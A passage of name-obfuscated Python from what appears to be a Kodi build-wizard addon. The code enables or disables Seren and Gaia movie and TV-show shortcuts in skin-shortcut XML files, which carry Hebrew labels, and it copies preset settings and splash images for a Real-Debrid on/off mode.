    O00O0O00OOO0O000O =O00O0O00OOO0O000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:547
    with open (OOOOO000OOO0000OO ,'w')as OO0OOOO0O00OOOO00 :#line:550
      OO0OOOO0O00OOOO00 .write (O00O0O00OOO0O000O )#line:551
    OOOOO000OOO0000OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:555
    with open (OOOOO000OOO0000OO ,'r')as OO0OOOO0O00OOOO00 :#line:556
      O00O0O00OOO0O000O =OO0OOOO0O00OOOO00 .read ()#line:557
    O00O0O00OOO0O000O =O00O0O00OOO0O000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:575
    with open (OOOOO000OOO0000OO ,'w')as OO0OOOO0O00OOOO00 :#line:578
      OO0OOOO0O00OOOO00 .write (O00O0O00OOO0O000O )#line:579
    OOOOO000OOO0000OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:583
    with open (OOOOO000OOO0000OO ,'r')as OO0OOOO0O00OOOO00 :#line:584
      O00O0O00OOO0O000O =OO0OOOO0O00OOOO00 .read ()#line:585
    O00O0O00OOO0O000O =O00O0O00OOO0O000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:603
    with open (OOOOO000OOO0000OO ,'w')as OO0OOOO0O00OOOO00 :#line:606
      OO0OOOO0O00OOOO00 .write (O00O0O00OOO0O000O )#line:607
    OOOOO000OOO0000OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:610
    with open (OOOOO000OOO0000OO ,'r')as OO0OOOO0O00OOOO00 :#line:611
      O00O0O00OOO0O000O =OO0OOOO0O00OOOO00 .read ()#line:612
    O00O0O00OOO0O000O =O00O0O00OOO0O000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:630
    with open (OOOOO000OOO0000OO ,'w')as OO0OOOO0O00OOOO00 :#line:633
      OO0OOOO0O00OOOO00 .write (O00O0O00OOO0O000O )#line:634
    OOOOO000OOO0000OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:636
    with open (OOOOO000OOO0000OO ,'r')as OO0OOOO0O00OOOO00 :#line:637
      O00O0O00OOO0O000O =OO0OOOO0O00OOOO00 .read ()#line:638
    O00O0O00OOO0O000O =O00O0O00OOO0O000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:656
    with open (OOOOO000OOO0000OO ,'w')as OO0OOOO0O00OOOO00 :#line:659
      OO0OOOO0O00OOOO00 .write (O00O0O00OOO0O000O )#line:660
    OOOOO000OOO0000OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:662
    with open (OOOOO000OOO0000OO ,'r')as OO0OOOO0O00OOOO00 :#line:663
      O00O0O00OOO0O000O =OO0OOOO0O00OOOO00 .read ()#line:664
    O00O0O00OOO0O000O =O00O0O00OOO0O000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:682
    with open (OOOOO000OOO0000OO ,'w')as OO0OOOO0O00OOOO00 :#line:685
      OO0OOOO0O00OOOO00 .write (O00O0O00OOO0O000O )#line:686
    OOOOO000OOO0000OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:689
    with open (OOOOO000OOO0000OO ,'r')as OO0OOOO0O00OOOO00 :#line:690
      O00O0O00OOO0O000O =OO0OOOO0O00OOOO00 .read ()#line:691
    O00O0O00OOO0O000O =O00O0O00OOO0O000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:709
    with open (OOOOO000OOO0000OO ,'w')as OO0OOOO0O00OOOO00 :#line:712
      OO0OOOO0O00OOOO00 .write (O00O0O00OOO0O000O )#line:713
def rdbuildinstall ():#line:716
  try :#line:717
   O00O00OOOOO00O00O =(ADDON .getSetting ("rdbuild"))#line:718
   if O00O00OOOOO00O00O =='true':#line:719
     OO0OO0OOOOOOOO0OO =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:720
     OO00OOOO00O00OOOO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:721
     copyfile (OO0OO0OOOOOOOO0OO ,OO00OOOO00O00OOOO )#line:722
  except :#line:723
     pass #line:724
def rdbuildaddonoff ():#line:727
    OO00000O00OO00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:730
    with open (OO00000O00OO00OOO ,'r')as O000O00000OO0OO0O :#line:731
      O00O00OOOOOO0O0O0 =O000O00000OO0OO0O .read ()#line:732
    O00O00OOOOOO0O0O0 =O00O00OOOOOO0O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:750
    with open (OO00000O00OO00OOO ,'w')as O000O00000OO0OO0O :#line:753
      O000O00000OO0OO0O .write (O00O00OOOOOO0O0O0 )#line:754
    OO00000O00OO00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:758
    with open (OO00000O00OO00OOO ,'r')as O000O00000OO0OO0O :#line:759
      O00O00OOOOOO0O0O0 =O000O00000OO0OO0O .read ()#line:760
    O00O00OOOOOO0O0O0 =O00O00OOOOOO0O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:778
    with open (OO00000O00OO00OOO ,'w')as O000O00000OO0OO0O :#line:781
      O000O00000OO0OO0O .write (O00O00OOOOOO0O0O0 )#line:782
    OO00000O00OO00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:786
    with open (OO00000O00OO00OOO ,'r')as O000O00000OO0OO0O :#line:787
      O00O00OOOOOO0O0O0 =O000O00000OO0OO0O .read ()#line:788
    O00O00OOOOOO0O0O0 =O00O00OOOOOO0O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:806
    with open (OO00000O00OO00OOO ,'w')as O000O00000OO0OO0O :#line:809
      O000O00000OO0OO0O .write (O00O00OOOOOO0O0O0 )#line:810
    OO00000O00OO00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:814
    with open (OO00000O00OO00OOO ,'r')as O000O00000OO0OO0O :#line:815
      O00O00OOOOOO0O0O0 =O000O00000OO0OO0O .read ()#line:816
    O00O00OOOOOO0O0O0 =O00O00OOOOOO0O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:834
    with open (OO00000O00OO00OOO ,'w')as O000O00000OO0OO0O :#line:837
      O000O00000OO0OO0O .write (O00O00OOOOOO0O0O0 )#line:838
    OO00000O00OO00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:841
    with open (OO00000O00OO00OOO ,'r')as O000O00000OO0OO0O :#line:842
      O00O00OOOOOO0O0O0 =O000O00000OO0OO0O .read ()#line:843
    O00O00OOOOOO0O0O0 =O00O00OOOOOO0O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:861
    with open (OO00000O00OO00OOO ,'w')as O000O00000OO0OO0O :#line:864
      O000O00000OO0OO0O .write (O00O00OOOOOO0O0O0 )#line:865
    OO00000O00OO00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:867
    with open (OO00000O00OO00OOO ,'r')as O000O00000OO0OO0O :#line:868
      O00O00OOOOOO0O0O0 =O000O00000OO0OO0O .read ()#line:869
    O00O00OOOOOO0O0O0 =O00O00OOOOOO0O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:887
    with open (OO00000O00OO00OOO ,'w')as O000O00000OO0OO0O :#line:890
      O000O00000OO0OO0O .write (O00O00OOOOOO0O0O0 )#line:891
    OO00000O00OO00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:893
    with open (OO00000O00OO00OOO ,'r')as O000O00000OO0OO0O :#line:894
      O00O00OOOOOO0O0O0 =O000O00000OO0OO0O .read ()#line:895
    O00O00OOOOOO0O0O0 =O00O00OOOOOO0O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:913
    with open (OO00000O00OO00OOO ,'w')as O000O00000OO0OO0O :#line:916
      O000O00000OO0OO0O .write (O00O00OOOOOO0O0O0 )#line:917
    OO00000O00OO00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:920
    with open (OO00000O00OO00OOO ,'r')as O000O00000OO0OO0O :#line:921
      O00O00OOOOOO0O0O0 =O000O00000OO0OO0O .read ()#line:922
    O00O00OOOOOO0O0O0 =O00O00OOOOOO0O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:940
    with open (OO00000O00OO00OOO ,'w')as O000O00000OO0OO0O :#line:943
      O000O00000OO0OO0O .write (O00O00OOOOOO0O0O0 )#line:944
def rdbuildinstalloff ():#line:947
    try :#line:948
       O0O0OOOO00OO0O0O0 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:949
       O0O00OOO0OO0000O0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:950
       copyfile (O0O0OOOO00OO0O0O0 ,O0O00OOO0OO0000O0 )#line:952
       O0O0OOOO00OO0O0O0 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:954
       O0O00OOO0OO0000O0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:955
       copyfile (O0O0OOOO00OO0O0O0 ,O0O00OOO0OO0000O0 )#line:957
       O0O0OOOO00OO0O0O0 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:959
       O0O00OOO0OO0000O0 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:960
       copyfile (O0O0OOOO00OO0O0O0 ,O0O00OOO0OO0000O0 )#line:962
       O0O0OOOO00OO0O0O0 =ADDONPATH +"/resources/rdoff/Splash.png"#line:965
       O0O00OOO0OO0000O0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:966
       copyfile (O0O0OOOO00OO0O0O0 ,O0O00OOO0OO0000O0 )#line:968
    except :#line:970
       pass #line:971
def rdbuildaddonON ():#line:978
    OOOOO0OO00O000O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:980
    with open (OOOOO0OO00O000O0O ,'r')as O00OOOO0OOOO0O00O :#line:981
      OO0O000OOOO0OOOO0 =O00OOOO0OOOO0O00O .read ()#line:982
    OO0O000OOOO0OOOO0 =OO0O000OOOO0OOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1000
    with open (OOOOO0OO00O000O0O ,'w')as O00OOOO0OOOO0O00O :#line:1003
      O00OOOO0OOOO0O00O .write (OO0O000OOOO0OOOO0 )#line:1004
    OOOOO0OO00O000O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1008
    with open (OOOOO0OO00O000O0O ,'r')as O00OOOO0OOOO0O00O :#line:1009
      OO0O000OOOO0OOOO0 =O00OOOO0OOOO0O00O .read ()#line:1010
    OO0O000OOOO0OOOO0 =OO0O000OOOO0OOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1028
    with open (OOOOO0OO00O000O0O ,'w')as O00OOOO0OOOO0O00O :#line:1031
      O00OOOO0OOOO0O00O .write (OO0O000OOOO0OOOO0 )#line:1032
    OOOOO0OO00O000O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1036
    with open (OOOOO0OO00O000O0O ,'r')as O00OOOO0OOOO0O00O :#line:1037
      OO0O000OOOO0OOOO0 =O00OOOO0OOOO0O00O .read ()#line:1038
    OO0O000OOOO0OOOO0 =OO0O000OOOO0OOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1056
    with open (OOOOO0OO00O000O0O ,'w')as O00OOOO0OOOO0O00O :#line:1059
      O00OOOO0OOOO0O00O .write (OO0O000OOOO0OOOO0 )#line:1060
    OOOOO0OO00O000O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1064
    with open (OOOOO0OO00O000O0O ,'r')as O00OOOO0OOOO0O00O :#line:1065
      OO0O000OOOO0OOOO0 =O00OOOO0OOOO0O00O .read ()#line:1066
    OO0O000OOOO0OOOO0 =OO0O000OOOO0OOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1084
    with open (OOOOO0OO00O000O0O ,'w')as O00OOOO0OOOO0O00O :#line:1087
      O00OOOO0OOOO0O00O .write (OO0O000OOOO0OOOO0 )#line:1088
    OOOOO0OO00O000O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1091
    with open (OOOOO0OO00O000O0O ,'r')as O00OOOO0OOOO0O00O :#line:1092
      OO0O000OOOO0OOOO0 =O00OOOO0OOOO0O00O .read ()#line:1093
    OO0O000OOOO0OOOO0 =OO0O000OOOO0OOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1111
    with open (OOOOO0OO00O000O0O ,'w')as O00OOOO0OOOO0O00O :#line:1114
      O00OOOO0OOOO0O00O .write (OO0O000OOOO0OOOO0 )#line:1115
    OOOOO0OO00O000O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1117
    with open (OOOOO0OO00O000O0O ,'r')as O00OOOO0OOOO0O00O :#line:1118
      OO0O000OOOO0OOOO0 =O00OOOO0OOOO0O00O .read ()#line:1119
    OO0O000OOOO0OOOO0 =OO0O000OOOO0OOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1137
    with open (OOOOO0OO00O000O0O ,'w')as O00OOOO0OOOO0O00O :#line:1140
      O00OOOO0OOOO0O00O .write (OO0O000OOOO0OOOO0 )#line:1141
    OOOOO0OO00O000O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1143
    with open (OOOOO0OO00O000O0O ,'r')as O00OOOO0OOOO0O00O :#line:1144
      OO0O000OOOO0OOOO0 =O00OOOO0OOOO0O00O .read ()#line:1145
    OO0O000OOOO0OOOO0 =OO0O000OOOO0OOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1163
    with open (OOOOO0OO00O000O0O ,'w')as O00OOOO0OOOO0O00O :#line:1166
      O00OOOO0OOOO0O00O .write (OO0O000OOOO0OOOO0 )#line:1167
    OOOOO0OO00O000O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1170
    with open (OOOOO0OO00O000O0O ,'r')as O00OOOO0OOOO0O00O :#line:1171
      OO0O000OOOO0OOOO0 =O00OOOO0OOOO0O00O .read ()#line:1172
    OO0O000OOOO0OOOO0 =OO0O000OOOO0OOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
